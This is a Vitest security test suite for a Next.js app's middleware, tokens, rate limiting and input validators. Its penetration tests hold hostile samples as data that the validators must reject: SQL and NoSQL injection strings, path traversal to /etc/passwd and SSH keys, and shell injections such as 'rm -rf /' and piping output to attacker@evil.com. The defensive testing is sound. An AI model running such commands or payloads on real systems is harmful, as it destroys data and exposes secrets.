/**
 * Comprehensive Security Test Suite
 * Tests all security vulnerabilities and protections
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { NextRequest, NextResponse } from 'next/server';
import { securityMiddleware } from '@/lib/security/secure-middleware';
import { validateToken, generateSecureToken } from '@/lib/security/jwt-validator';
import { createRateLimiter } from '@/lib/security/rate-limiter';
import { 
  sanitizeText, 
  sanitizeHTML, 
  validateEmail,
  validateUUID,
  ValidationSchemas 
} from '@/lib/security/input-validator';

// Mock environment variables
vi.mock('process.env', () => ({
  NODE_ENV: 'test',
  JWT_SECRET: 'test-secret-key-for-testing-only',
  ALLOWED_ORIGINS: 'http://localhost:3000,https://app.example.com',
  NEXT_PUBLIC_APP_URL: 'http://localhost:3000',
}));

describe('Security Audit Tests', () => {
  
  describe('1. Authentication & JWT Validation', () => {
    
    it('should reject requests without authentication token', async () => {
      const request = new NextRequest('http://localhost:3000/api/master-admin/organizations');
      const response = await securityMiddleware(request);
      
      expect(response.status).toBe(401);
      const body = await response.json();
      expect(body.error).toBe('Authentication required');
    });
    
    it('should reject invalid JWT tokens', async () => {
      const request = new NextRequest('http://localhost:3000/api/master-admin/organizations', {
        headers: {
          'Authorization': 'Bearer invalid.token.here'
        }
      });
      
      const response = await securityMiddleware(request);
      expect(response.status).toBe(401);
    });
    
    it('should reject expired tokens', async () => {
      // Create an expired token
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MDAwMDAwMDB9.test';
      
      const validation = await validateToken(expiredToken);
      expect(validation.valid).toBe(false);
      expect(validation.expired).toBe(true);
    });
    
    it('should validate legitimate tokens', async () => {
      const payload = {
        userId: '123e4567-e89b-12d3-a456-426614174000',
        email: 'admin@example.com',
        roles: ['MASTER_ADMIN'],
        isMasterAdmin: true,
        sessionId: 'session-123',
        organizationId: 'org-123'
      };
      
      const token = await generateSecureToken(payload);
      const validation = await validateToken(token);
      
      expect(validation.valid).toBe(true);
      expect(validation.payload?.userId).toBe(payload.userId);
      expect(validation.payload?.isMasterAdmin).toBe(true);
    });
    
    it('should track failed authentication attempts', async () => {
      const ip = '192.168.1.100';
      const request = new NextRequest('http://localhost:3000/api/admin', {
        headers: {
          'x-forwarded-for': ip,
          'Authorization': 'Bearer invalid'
        }
      });
      
      // Make multiple failed attempts
      for (let i = 0; i < 6; i++) {
        await securityMiddleware(request);
      }
      
      // Should be blocked after 5 attempts
      const response = await securityMiddleware(request);
      expect(response.status).toBe(429);
      expect(response.headers.get('Retry-After')).toBeDefined();
    });
  });
  
  describe('2. CORS Protection', () => {
    
    it('should reject requests from unauthorized origins', async () => {
      const request = new NextRequest('http://localhost:3000/api/master-admin/organizations', {
        headers: {
          'origin': 'http://evil.com'
        }
      });
      
      const response = await securityMiddleware(request);
      expect(response.status).toBe(403);
    });
    
    it('should allow requests from authorized origins', async () => {
      const request = new NextRequest('http://localhost:3000/api/health', {
        headers: {
          'origin': 'http://localhost:3000'
        }
      });
      
      const response = await securityMiddleware(request);
      expect(response.status).not.toBe(403);
    });
    
    it('should handle preflight OPTIONS requests', async () => {
      const request = new NextRequest('http://localhost:3000/api/test', {
        method: 'OPTIONS',
        headers: {
          'origin': 'http://localhost:3000'
        }
      });
      
      const response = await securityMiddleware(request);
      expect(response.status).toBe(200);
      expect(response.headers.get('Access-Control-Allow-Methods')).toContain('GET');
      expect(response.headers.get('Access-Control-Allow-Headers')).toContain('Authorization');
    });
  });
  
  describe('3. Rate Limiting', () => {
    
    it('should enforce rate limits on authentication endpoints', async () => {
      const limiter = createRateLimiter({
        windowMs: 1000,
        maxRequests: 3
      });
      
      const request = new NextRequest('http://localhost:3000/api/auth/login');
      
      // Make requests up to limit
      for (let i = 0; i < 3; i++) {
        const response = await limiter(request);
        expect(response).toBeNull(); // Not limited
      }
      
      // Next request should be rate limited
      const response = await limiter(request);
      expect(response).not.toBeNull();
      expect(response?.status).toBe(429);
    });
    
    it('should provide rate limit headers', async () => {
      const limiter = createRateLimiter({
        windowMs: 60000,
        maxRequests: 10,
        standardHeaders: true
      });
      
      const request = new NextRequest('http://localhost:3000/api/test');
      
      // Exceed limit
      for (let i = 0; i < 11; i++) {
        await limiter(request);
      }
      
      const response = await limiter(request);
      expect(response?.headers.get('RateLimit-Limit')).toBe('10');
      expect(response?.headers.get('RateLimit-Remaining')).toBe('0');
      expect(response?.headers.get('Retry-After')).toBeDefined();
    });
  });
  
  describe('4. Input Validation & Sanitization', () => {
    
    it('should prevent XSS attacks in text input', () => {
      const maliciousInput = '<script>alert("XSS")</script>Hello';
      const sanitized = sanitizeText(maliciousInput);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toBe('Hello');
    });
    
    it('should sanitize HTML content safely', () => {
      const html = '<p>Hello</p><script>alert("XSS")</script><a href="javascript:void(0)">Link</a>';
      const sanitized = sanitizeHTML(html);
      
      expect(sanitized).toContain('<p>Hello</p>');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('javascript:');
    });
    
    it('should validate email addresses', () => {
      const valid = validateEmail('admin@example.com');
      expect(valid.valid).toBe(true);
      expect(valid.sanitized).toBe('admin@example.com');
      
      const invalid = validateEmail('not-an-email');
      expect(invalid.valid).toBe(false);
      
      const injection = validateEmail('admin@example.com<script>');
      expect(injection.valid).toBe(false);
    });
    
    it('should validate UUIDs', () => {
      const validUUID = '123e4567-e89b-12d3-a456-426614174000';
      expect(validateUUID(validUUID)).toBe(true);
      
      const invalidUUID = '123-456-789';
      expect(validateUUID(invalidUUID)).toBe(false);
      
      const sqlInjection = "123e4567-e89b-12d3-a456-426614174000' OR '1'='1";
      expect(validateUUID(sqlInjection)).toBe(false);
    });
    
    it('should validate organization status enum', () => {
      const schema = ValidationSchemas.organizationStatus;
      
      expect(() => schema.parse('ACTIVE')).not.toThrow();
      expect(() => schema.parse('SUSPENDED')).not.toThrow();
      expect(() => schema.parse('INVALID_STATUS')).toThrow();
      expect(() => schema.parse("ACTIVE' OR '1'='1")).toThrow();
    });
    
    it('should prevent SQL injection in search queries', () => {
      const schema = ValidationSchemas.searchQuery;
      
      expect(() => schema.parse('normal search')).not.toThrow();
      expect(() => schema.parse("'; DROP TABLE users; --")).toThrow();
      expect(() => schema.parse("1' UNION SELECT * FROM users")).toThrow();
    });
  });
  
  describe('5. Security Headers', () => {
    
    it('should set security headers on responses', async () => {
      const request = new NextRequest('http://localhost:3000/');
      const response = await securityMiddleware(request);
      
      expect(response.headers.get('X-Frame-Options')).toBe('DENY');
      expect(response.headers.get('X-Content-Type-Options')).toBe('nosniff');
      expect(response.headers.get('X-XSS-Protection')).toBe('1; mode=block');
      expect(response.headers.get('Strict-Transport-Security')).toContain('max-age=31536000');
      expect(response.headers.get('Content-Security-Policy')).toBeDefined();
    });
  });
  
  describe('6. Master Admin Access Control', () => {
    
    it('should deny access to master admin routes without proper role', async () => {
      const payload = {
        userId: 'user-123',
        email: 'user@example.com',
        roles: ['ADMIN'],
        isMasterAdmin: false,
        sessionId: 'session-123'
      };
      
      const token = await generateSecureToken(payload);
      const request = new NextRequest('http://localhost:3000/api/master-admin/organizations', {
        headers: {
          'Authorization': `Bearer ${token}`
        }
      });
      
      const response = await securityMiddleware(request);
      expect(response.status).toBe(403);
      const body = await response.json();
      expect(body.error).toBe('Master admin access required');
    });
    
    it('should allow master admin access with proper role', async () => {
      const payload = {
        userId: 'admin-123',
        email: 'master@example.com',
        roles: ['MASTER_ADMIN'],
        isMasterAdmin: true,
        sessionId: 'session-123'
      };
      
      const token = await generateSecureToken(payload);
      const request = new NextRequest('http://localhost:3000/api/master-admin/organizations', {
        headers: {
          'Authorization': `Bearer ${token}`
        }
      });
      
      const response = await securityMiddleware(request);
      expect(response.status).not.toBe(403);
      expect(response.status).not.toBe(401);
    });
  });
  
  describe('7. Request Size Limits', () => {
    
    it('should reject requests exceeding size limit', async () => {
      const largeBody = 'x'.repeat(2 * 1024 * 1024); // 2MB
      const request = new NextRequest('http://localhost:3000/api/upload', {
        method: 'POST',
        headers: {
          'Content-Length': String(largeBody.length)
        },
        body: largeBody
      });
      
      const response = await securityMiddleware(request);
      expect(response.status).toBe(413);
    });
  });
  
  describe('8. Session Security', () => {
    
    it('should validate session IDs in tokens', async () => {
      const payload = {
        userId: 'user-123',
        email: 'user@example.com',
        roles: ['USER'],
        isMasterAdmin: false,
        sessionId: '', // Missing session ID
      };
      
      const token = await generateSecureToken(payload);
      const validation = await validateToken(token);
      
      expect(validation.valid).toBe(false);
      expect(validation.error).toContain('Invalid token structure');
    });
  });
  
  describe('9. CSRF Protection', () => {
    
    it('should validate CSRF tokens', () => {
      const { generateCSRFToken, validateCSRFToken } = require('@/lib/security/jwt-validator');
      
      const sessionToken = 'session-123';
      const csrfToken = generateCSRFToken(sessionToken);
      
      expect(validateCSRFToken(csrfToken, sessionToken)).toBe(true);
      expect(validateCSRFToken('invalid-csrf', sessionToken)).toBe(false);
    });
  });
  
  describe('10. Audit Logging', () => {
    
    it('should log security events', async () => {
      const consoleSpy = vi.spyOn(console, 'log');
      
      const request = new NextRequest('http://localhost:3000/api/admin', {
        headers: {
          'Authorization': 'Bearer invalid-token'
        }
      });
      
      await securityMiddleware(request);
      
      expect(consoleSpy).toHaveBeenCalledWith(
        expect.stringContaining('[SECURITY]'),
        expect.stringContaining('AUTH_INVALID')
      );
      
      consoleSpy.mockRestore();
    });
  });
});

describe('Security Penetration Tests', () => {
  
  it('should prevent SQL injection attacks', () => {
    const attacks = [
      "1' OR '1'='1",
      "'; DROP TABLE users; --",
      "1 UNION SELECT * FROM passwords",
      "admin'--",
      "' OR 1=1--",
    ];
    
    attacks.forEach(attack => {
      expect(() => ValidationSchemas.searchQuery.parse(attack)).toThrow();
    });
  });
  
  it('should prevent NoSQL injection attacks', () => {
    const { sanitizeMongoQuery } = require('@/lib/security/input-validator');
    
    const attack = {
      username: 'admin',
      $gt: '',
      $ne: null,
      password: { $regex: '.*' }
    };
    
    const sanitized = sanitizeMongoQuery(attack);
    expect(sanitized.$gt).toBeUndefined();
    expect(sanitized.$ne).toBeUndefined();
    expect(sanitized.password).toBeUndefined();
  });
  
  it('should prevent path traversal attacks', () => {
    const { sanitizePath } = require('@/lib/security/input-validator');
    
    const attacks = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32',
      '/var/www/../../etc/passwd',
      '~/../../root/.ssh/id_rsa',
    ];
    
    attacks.forEach(attack => {
      const sanitized = sanitizePath(attack);
      expect(sanitized).not.toContain('..');
      expect(sanitized).not.toContain('~');
      expect(sanitized).not.toMatch(/^[\/\\]/);
    });
  });
  
  it('should prevent command injection attacks', () => {
    const { sanitizeShellCommand } = require('@/lib/security/input-validator');
    
    const attacks = [
      'ls; rm -rf /',
      'ping google.com && cat /etc/passwd',
      'echo test | mail attacker@evil.com',
      '`cat /etc/passwd`',
      '$(whoami)',
    ];
    
    attacks.forEach(attack => {
      const sanitized = sanitizeShellCommand(attack);
      expect(sanitized).not.toContain(';');
      expect(sanitized).not.toContain('&&');
      expect(sanitized).not.toContain('|');
      expect(sanitized).not.toContain('`');
      expect(sanitized).not.toContain('$');
    });
  });
  
  it('should prevent XXE attacks in file uploads', () => {
    const { validateFileUpload } = require('@/lib/security/input-validator');
    
    const maliciousFiles = [
      { name: 'evil.exe', type: 'application/x-msdownload', size: 1024 },
      { name: 'script.js', type: 'text/javascript', size: 1024 },
      { name: 'backdoor.php', type: 'application/x-php', size: 1024 },
      { name: '../../../etc/passwd', type: 'text/plain', size: 1024 },
    ];
    
    maliciousFiles.forEach(file => {
      const result = validateFileUpload(file);
      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });
  });
});